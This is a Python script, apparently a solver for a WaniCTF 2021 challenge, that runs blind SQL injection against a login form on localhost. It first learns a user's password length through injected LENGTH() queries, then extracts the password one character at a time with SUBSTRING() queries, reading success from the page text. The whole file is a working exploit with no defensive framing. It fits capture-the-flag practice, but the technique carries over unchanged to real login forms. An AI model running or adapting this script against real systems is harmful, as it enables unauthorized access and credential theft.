import sys
import requests
import time


def get_length(url):
    for count in range(1, 60):
        sql = "' or (SELECT LENGTH(password) FROM users WHERE email like 'wanictf21spring@gmail.com') like {i};".format(
            i=count
        )
        payload = {"email": "wanictf21spring@gmail.com", "password": sql}
        response = requests.post(url, data=payload)
        if "Animal Collection" in response.text:
            password_length = count
            print("pass's length : " + str(password_length))
            return password_length
    return -1


def blind_sql_injection(url, password_length):
    flag = ""
    for count in range(1, password_length + 1):
        for char_number in range(48, 126):
            if char_number == 95:
                continue
            c = chr(char_number)
            sql = "' or SUBSTRING((SELECT password FROM users WHERE email like 'wanictf21spring@gmail.com'), {i}, 1) like '{char}';".format(
                i=count, char=c
            )
            payload = {"email": "wanictf21spring@gmail.com", "password": sql}
            response = requests.post(url, data=payload)
            if "Animal Collection" in response.text:
                print(" " + str(count) + ": " + c + " " + str(char_number))
                flag += c
                break
        time.sleep(1)
    print(flag)


def main():
    url = "http://localhost:8080/"
    password_length = get_length(url)
    if password_length != -1:
        blind_sql_injection(url, password_length)
    else:
        print("you can't get password length")


if __name__ == "__main__":
    main()
